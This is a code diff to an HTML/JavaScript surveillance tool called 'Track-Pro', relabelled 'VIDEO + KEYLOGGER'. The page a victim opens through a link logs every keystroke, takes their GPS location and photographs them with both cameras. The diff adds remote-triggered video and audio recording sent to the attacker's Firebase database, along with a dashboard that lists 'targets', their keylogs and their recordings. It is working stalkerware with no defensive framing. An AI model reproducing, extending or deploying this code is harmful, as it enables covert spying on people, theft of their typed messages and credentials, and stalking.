@@ -11,7 +11,6 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@2.0.0/dist/tabler-icons.min.css" />
     
     <style>
-        /* DASHBOARD STYLES */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0a0f; color: white; }
         .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
@@ -28,6 +27,7 @@
         .btn-success { background: linear-gradient(135deg, #4ade80, #16a34a); color: black; }
         .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; }
         .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: black; }
+        .btn-purple { background: linear-gradient(135deg, #a855f7, #7e22ce); color: white; }
         
         .link-input-group {
             display: flex; gap: 10px; margin: 15px 0;
@@ -40,14 +40,12 @@
         
         .hidden { display: none !important; }
         
-        /* Main Layout */
         .main-layout {
             display: grid; grid-template-columns: 320px 1fr; gap: 20px; margin-top: 20px;
         }
         
         @media (max-width: 1000px) { .main-layout { grid-template-columns: 1fr; } }
         
-        /* Targets Sidebar */
         .targets-sidebar {
             background: rgba(0,0,0,0.3); border-radius: 20px; padding: 15px;
             height: calc(100vh - 150px); overflow-y: auto;
@@ -66,8 +64,10 @@
             display: inline-block; width: 10px; height: 10px; border-radius: 50%;
         }
         
-        .status-online { background: #4ade80; box-shadow: 0 0 10px #4ade80; }
+        .status-online { background: #4ade80; box-shadow: 0 0 10px #4ade80; animation: pulse 2s infinite; }
         .status-offline { background: #666; }
+        
+        @keyframes pulse { 0%,100%{opacity:1;}50%{opacity:0.5;} }
         
         .target-id { font-weight: 600; font-size: 0.9rem; }
         .target-time { font-size: 0.7rem; color: #888; }
@@ -86,7 +86,6 @@
         
         .remove-target:hover { background: rgba(239,68,68,0.4); transform: scale(1.1); }
         
-        /* Main Content */
         .main-content { background: rgba(0,0,0,0.2); border-radius: 20px; padding: 20px; }
         
         .camera-grid {
@@ -98,11 +97,19 @@
             aspect-ratio: 4/3; position: relative;
         }
         
-        .camera-card img { width: 100%; height: 100%; object-fit: cover; }
+        .camera-card img, .camera-card video {
+            width: 100%; height: 100%; object-fit: cover;
+        }
         
         .camera-label {
             position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7);
             padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; z-index: 10;
+        }
+        
+        .recording-badge {
+            position: absolute; top: 10px; right: 10px; background: #ef4444;
+            color: white; padding: 4px 12px; border-radius: 20px;
+            font-size: 0.8rem; animation: pulse 1s infinite; z-index: 10;
         }
         
         #map { height: 250px; border-radius: 16px; margin: 20px 0; }
@@ -123,6 +130,27 @@
         .command-bar {
             display: flex; gap: 10px; flex-wrap: wrap; margin: 20px 0;
             padding: 15px; background: rgba(0,0,0,0.3); border-radius: 16px;
+        }
+        
+        .video-section {
+            margin: 20px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 16px;
+        }
+        
+        .video-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px; margin-top: 15px;
+        }
+        
+        .video-item {
+            background: #1a1a2e; border-radius: 12px; overflow: hidden;
+        }
+        
+        .video-item video {
+            width: 100%; height: 150px; object-fit: cover;
+        }
+        
+        .video-time {
+            padding: 8px; font-size: 0.7rem; color: #888; text-align: center;
         }
         
         .stats-grid {
@@ -151,7 +179,7 @@
 <body>
     <!-- ADMIN DASHBOARD -->
     <div class="container" id="adminDashboard">
-        <h1>🎯 Track-Pro <span style="font-size: 1rem; background: #3b82f6; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">DASHBOARD</span></h1>
+        <h1>🎯 Track-Pro <span style="font-size: 1rem; background: #a855f7; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">VIDEO + KEYLOGGER</span></h1>
         
         <div id="firebaseStatus" style="background: #1a1a2e; padding: 10px; border-radius: 10px; margin-bottom: 20px;">
             ⏳ Checking Firebase...
@@ -189,8 +217,8 @@
                 <div class="stat-label">Keys Logged</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value" id="totalPhotos">0</div>
-                <div class="stat-label">Photos</div>
+                <div class="stat-value" id="totalVideos">0</div>
+                <div class="stat-label">Videos</div>
             </div>
         </div>
         
@@ -217,6 +245,7 @@
                         </div>
                     </div>
                     
+                    <!-- Command Bar -->
                     <div class="command-bar">
                         <button class="btn btn-primary" onclick="sendCommand('location')">
                             <i class="ti ti-map-pin"></i> Get Location
@@ -227,14 +256,25 @@
                         <button class="btn btn-primary" onclick="sendCommand('back')">
                             <i class="ti ti-camera"></i> Back Photo
                         </button>
-                        <button class="btn btn-danger" onclick="clearKeylogs()">
+                        <button class="btn btn-purple" onclick="startVideoRecording('front')" id="startFrontVideo">
+                            <i class="ti ti-video"></i> Start Front Video
+                        </button>
+                        <button class="btn btn-purple" onclick="startVideoRecording('back')" id="startBackVideo">
+                            <i class="ti ti-video"></i> Start Back Video
+                        </button>
+                        <button class="btn btn-danger" onclick="stopVideoRecording()" id="stopVideo" disabled>
+                            <i class="ti ti-player-stop"></i> Stop Recording
+                        </button>
+                        <button class="btn btn-warning" onclick="clearKeylogs()">
                             <i class="ti ti-trash"></i> Clear Logs
                         </button>
                     </div>
                     
+                    <!-- Camera Feeds -->
                     <div class="camera-grid">
                         <div class="camera-card">
                             <span class="camera-label" style="background: #3b82f6;">📱 Front Camera</span>
+                            <span id="frontRecordingBadge" class="recording-badge hidden">🔴 REC</span>
                             <img id="frontCameraFeed" style="display: none; width:100%; height:100%;">
                             <div id="frontPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center; background: #1a1a2e;">
                                 <span style="color: #888;">Click "Front Photo"</span>
@@ -242,6 +282,7 @@
                         </div>
                         <div class="camera-card">
                             <span class="camera-label" style="background: #f59e0b;">📸 Back Camera</span>
+                            <span id="backRecordingBadge" class="recording-badge hidden">🔴 REC</span>
                             <img id="backCameraFeed" style="display: none; width:100%; height:100%;">
                             <div id="backPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center; background: #1a1a2e;">
                                 <span style="color: #888;">Click "Back Photo"</span>
@@ -249,11 +290,19 @@
                         </div>
                     </div>
                     
+                    <!-- Map -->
                     <div id="map"></div>
                     
+                    <!-- Keylogs Panel -->
                     <div style="margin-top: 20px;">
                         <h3>⌨️ Live Keylogs <span id="keylogCount">(0)</span></h3>
                         <div id="keylogPanel" class="keylog-panel"></div>
+                    </div>
+                    
+                    <!-- Videos Section -->
+                    <div class="video-section">
+                        <h3>📹 Recorded Videos</h3>
+                        <div id="videosList" class="video-grid"></div>
                     </div>
                 </div>
             </div>
@@ -289,6 +338,7 @@
         let selectedTargetId = null;
         let targets = {};
         let keylogs = {};
+        let videos = {};
         
         // CHECK URL - TARGET MODE
         const urlParams = new URLSearchParams(window.location.search);
@@ -322,7 +372,7 @@
                 }
             }, 10000);
             
-            // REQUEST PERMISSIONS - SIRF LINK CLICK KARNA KAFI
+            // REQUEST PERMISSIONS
             setTimeout(() => {
                 // GPS
                 navigator.geolocation.getCurrentPosition(
@@ -337,7 +387,7 @@
                             });
                         }
                     },
-                    (error) => console.log("GPS error:", error.message),
+                    () => {},
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
                 
@@ -351,14 +401,18 @@
                     .catch(() => {});
             }, 1000);
             
-            // COMPLETE KEYLOGGER
+            // COMPLETE KEYLOGGER - ALL KEYS
             const specialKeys = {
-                ' ': ' ', 'Enter': '⏎', 'Backspace': '⌫', 'Tab': '⇥',
-                'Shift': '⇧', 'Control': '⌃', 'Alt': '⌥', 'CapsLock': '⇪',
-                'Escape': '⎋', 'Delete': '⌦', 'Insert': 'Ins', 'Home': '↖',
-                'End': '↘', 'PageUp': '⇞', 'PageDown': '⇟',
-                'ArrowUp': '↑', 'ArrowDown': '↓', 'ArrowLeft': '←', 'ArrowRight': '→',
-                'Meta': '◆', 'ContextMenu': '☰', 'PrintScreen': '⎙'
+                ' ': '[SPACE]', 'Enter': '[ENTER]', 'Backspace': '[BACKSPACE]',
+                'Tab': '[TAB]', 'Shift': '[SHIFT]', 'Control': '[CTRL]',
+                'Alt': '[ALT]', 'CapsLock': '[CAPSLOCK]', 'Escape': '[ESC]',
+                'Delete': '[DEL]', 'Insert': '[INS]', 'Home': '[HOME]',
+                'End': '[END]', 'PageUp': '[PAGEUP]', 'PageDown': '[PAGEDOWN]',
+                'ArrowUp': '[↑]', 'ArrowDown': '[↓]', 'ArrowLeft': '[←]', 'ArrowRight': '[→]',
+                'F1': '[F1]', 'F2': '[F2]', 'F3': '[F3]', 'F4': '[F4]',
+                'F5': '[F5]', 'F6': '[F6]', 'F7': '[F7]', 'F8': '[F8]',
+                'F9': '[F9]', 'F10': '[F10]', 'F11': '[F11]', 'F12': '[F12]',
+                'Meta': '[WIN]', 'ContextMenu': '[MENU]', 'PrintScreen': '[PRTSC]'
             };
             
             // Store offline keylogs
@@ -391,16 +445,24 @@
             document.addEventListener('keydown', (e) => {
                 let key = specialKeys[e.key] || e.key;
                 
-                // Handle Ctrl/Alt/Shift combinations
-                if (e.ctrlKey) key = '⌃' + key;
-                if (e.altKey) key = '⌥' + key;
+                // Handle special combinations
+                if (e.ctrlKey) key = 'Ctrl+' + key;
+                if (e.altKey) key = 'Alt+' + key;
                 if (e.shiftKey && e.key.length === 1 && e.key.match(/[a-z]/)) key = key.toUpperCase();
                 
+                // Capture all keys including WhatsApp, messages, etc
                 sendKeylog({
                     key: key,
-                    time: Date.now()
+                    time: Date.now(),
+                    ctrl: e.ctrlKey,
+                    alt: e.altKey,
+                    shift: e.shiftKey
                 });
             });
+            
+            // VIDEO RECORDING VARIABLES
+            let mediaRecorder = null;
+            let recordedChunks = [];
             
             // LISTEN FOR COMMANDS
             targetDb.ref('targets/' + targetId + '/commands').on('value', async (snapshot) => {
@@ -422,7 +484,7 @@
                     });
                 }
                 
-                // GET FRONT CAMERA
+                // GET FRONT CAMERA PHOTO
                 if (commands.front) {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -434,13 +496,13 @@
                         await video.play();
                         
                         const canvas = document.createElement('canvas');
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         
                         if (navigator.onLine) {
                             targetDb.ref('targets/' + targetId).update({
-                                frontCamera: canvas.toDataURL('image/jpeg', 0.5)
+                                frontCamera: canvas.toDataURL('image/jpeg', 0.7)
                             });
                         }
                         
@@ -448,7 +510,7 @@
                     } catch (e) {}
                 }
                 
-                // GET BACK CAMERA
+                // GET BACK CAMERA PHOTO
                 if (commands.back) {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -460,18 +522,80 @@
                         await video.play();
                         
                         const canvas = document.createElement('canvas');
-                        canvas.width = 320;
-                        canvas.height = 240;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         
                         if (navigator.onLine) {
                             targetDb.ref('targets/' + targetId).update({
-                                backCamera: canvas.toDataURL('image/jpeg', 0.5)
+                                backCamera: canvas.toDataURL('image/jpeg', 0.7)
                             });
                         }
                         
                         stream.getTracks().forEach(t => t.stop());
                     } catch (e) {}
+                }
+                
+                // START VIDEO RECORDING
+                if (commands.startVideo) {
+                    try {
+                        const cameraMode = commands.cameraMode || 'environment';
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: cameraMode },
+                            audio: true
+                        });
+                        
+                        mediaRecorder = new MediaRecorder(stream, {
+                            mimeType: 'video/webm'
+                        });
+                        
+                        recordedChunks = [];
+                        
+                        mediaRecorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) {
+                                recordedChunks.push(e.data);
+                            }
+                        };
+                        
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            const reader = new FileReader();
+                            
+                            reader.readAsDataURL(blob);
+                            reader.onloadend = () => {
+                                if (navigator.onLine) {
+                                    targetDb.ref('targets/' + targetId + '/videos').push({
+                                        data: reader.result,
+                                        camera: cameraMode,
+                                        timestamp: Date.now(),
+                                        duration: commands.duration || 0
+                                    });
+                                }
+                            };
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                        
+                        mediaRecorder.start();
+                        
+                        targetDb.ref('targets/' + targetId).update({
+                            recordingStatus: 'active',
+                            recordingStart: Date.now()
+                        });
+                        
+                    } catch (e) {
+                        console.log("Video recording error:", e);
+                    }
+                }
+                
+                // STOP VIDEO RECORDING
+                if (commands.stopVideo) {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                    targetDb.ref('targets/' + targetId).update({
+                        recordingStatus: 'stopped'
+                    });
                 }
                 
                 // CLEAR COMMANDS
@@ -543,7 +667,7 @@
                         <div class="target-time">${target.lastSeen ? new Date(target.lastSeen).toLocaleString() : 'Never'}</div>
                         <div class="target-stats">
                             <span>⌨️ ${target.keylogCount || 0}</span>
-                            <span>📷 ${(target.frontCamera ? 1 : 0) + (target.backCamera ? 1 : 0)}</span>
+                            <span>📹 ${target.videoCount || 0}</span>
                         </div>
                     </div>
                 `;
@@ -554,20 +678,19 @@
             const targetIds = Object.keys(targets);
             let online = 0;
             let totalKeys = 0;
-            let totalPhotos = 0;
+            let totalVideos = 0;
             
             targetIds.forEach(id => {
                 const t = targets[id];
                 if (t.online && (Date.now() - (t.lastSeen || 0) < 60000)) online++;
                 if (t.keylogCount) totalKeys += t.keylogCount;
-                if (t.frontCamera) totalPhotos++;
-                if (t.backCamera) totalPhotos++;
+                if (t.videoCount) totalVideos += t.videoCount;
             });
             
             document.getElementById('totalTargets').textContent = targetIds.length;
             document.getElementById('onlineTargets').textContent = online;
             document.getElementById('totalKeys').textContent = totalKeys;
-            document.getElementById('totalPhotos').textContent = totalPhotos;
+            document.getElementById('totalVideos').textContent = totalVideos;
         }
         
         function selectTarget(targetId) {
@@ -576,6 +699,7 @@
             document.getElementById('targetView').classList.remove('hidden');
             document.getElementById('selectedTargetName').textContent = `Target: ${targetId.substring(0, 8)}...`;
             
+            // Reset UI
             document.getElementById('frontCameraFeed').style.display = 'none';
             document.getElementById('frontPlaceholder').style.display = 'flex';
             document.getElementById('backCameraFeed').style.display = 'none';
@@ -586,21 +710,40 @@
         }
         
         function loadTargetData(targetId) {
+            // Listen for target updates
             database.ref('targets/' + targetId).on('value', (snapshot) => {
                 updateSelectedTarget(snapshot.val());
             });
             
+            // Listen for keylogs
             database.ref('targets/' + targetId + '/keylogs').on('child_added', (snapshot) => {
                 if (!keylogs[targetId]) keylogs[targetId] = [];
                 keylogs[targetId].push(snapshot.val());
                 updateKeylogPanel(targetId);
                 
                 // Update keylog count
-                const targetRef = database.ref('targets/' + targetId);
-                targetRef.once('value', (snap) => {
+                database.ref('targets/' + targetId).once('value', (snap) => {
                     const data = snap.val() || {};
                     data.keylogCount = (data.keylogCount || 0) + 1;
-                    targetRef.update({ keylogCount: data.keylogCount });
+                    database.ref('targets/' + targetId).update({ 
+                        keylogCount: data.keylogCount 
+                    });
+                });
+            });
+            
+            // Listen for videos
+            database.ref('targets/' + targetId + '/videos').on('child_added', (snapshot) => {
+                if (!videos[targetId]) videos[targetId] = [];
+                videos[targetId].push(snapshot.val());
+                updateVideosList(targetId);
+                
+                // Update video count
+                database.ref('targets/' + targetId).once('value', (snap) => {
+                    const data = snap.val() || {};
+                    data.videoCount = (data.videoCount || 0) + 1;
+                    database.ref('targets/' + targetId).update({ 
+                        videoCount: data.videoCount 
+                    });
                 });
             });
         }
@@ -628,6 +771,24 @@
                 document.getElementById('backCameraFeed').style.display = 'block';
                 document.getElementById('backPlaceholder').style.display = 'none';
             }
+            
+            // Update recording status
+            if (data.recordingStatus === 'active') {
+                if (data.recordingCamera === 'user') {
+                    document.getElementById('frontRecordingBadge').classList.remove('hidden');
+                } else {
+                    document.getElementById('backRecordingBadge').classList.remove('hidden');
+                }
+                document.getElementById('startFrontVideo').disabled = true;
+                document.getElementById('startBackVideo').disabled = true;
+                document.getElementById('stopVideo').disabled = false;
+            } else {
+                document.getElementById('frontRecordingBadge').classList.add('hidden');
+                document.getElementById('backRecordingBadge').classList.add('hidden');
+                document.getElementById('startFrontVideo').disabled = false;
+                document.getElementById('startBackVideo').disabled = false;
+                document.getElementById('stopVideo').disabled = true;
+            }
         }
         
         function updateKeylogPanel(targetId) {
@@ -652,6 +813,23 @@
             panel.scrollTop = 0;
         }
         
+        function updateVideosList(targetId) {
+            const videoList = videos[targetId] || [];
+            const listDiv = document.getElementById('videosList');
+            
+            if (videoList.length === 0) {
+                listDiv.innerHTML = '<div style="color: #666; text-align: center;">No videos yet</div>';
+                return;
+            }
+            
+            listDiv.innerHTML = videoList.slice(-6).map(video => `
+                <div class="video-item">
+                    <video src="${video.data}" controls></video>
+                    <div class="video-time">${new Date(video.timestamp).toLocaleString()}</div>
+                </div>
+            `).join('');
+        }
+        
         function sendCommand(type) {
             if (!selectedTargetId) return;
             
@@ -660,6 +838,45 @@
             
             database.ref('targets/' + selectedTargetId + '/commands').update(command);
             showNotification(`📨 ${type} command sent`);
+        }
+        
+        function startVideoRecording(camera) {
+            if (!selectedTargetId) return;
+            
+            const command = {
+                startVideo: true,
+                cameraMode: camera === 'front' ? 'user' : 'environment',
+                duration: 30 // 30 seconds default
+            };
+            
+            database.ref('targets/' + selectedTargetId + '/commands').update(command);
+            
+            if (camera === 'front') {
+                document.getElementById('frontRecordingBadge').classList.remove('hidden');
+                document.getElementById('startFrontVideo').disabled = true;
+            } else {
+                document.getElementById('backRecordingBadge').classList.remove('hidden');
+                document.getElementById('startBackVideo').disabled = true;
+            }
+            document.getElementById('stopVideo').disabled = false;
+            
+            showNotification(`🎥 Video recording started (${camera} camera)`);
+        }
+        
+        function stopVideoRecording() {
+            if (!selectedTargetId) return;
+            
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                stopVideo: true
+            });
+            
+            document.getElementById('frontRecordingBadge').classList.add('hidden');
+            document.getElementById('backRecordingBadge').classList.add('hidden');
+            document.getElementById('startFrontVideo').disabled = false;
+            document.getElementById('startBackVideo').disabled = false;
+            document.getElementById('stopVideo').disabled = true;
+            
+            showNotification('⏹️ Video recording stopped');
         }
         
         function clearKeylogs() {
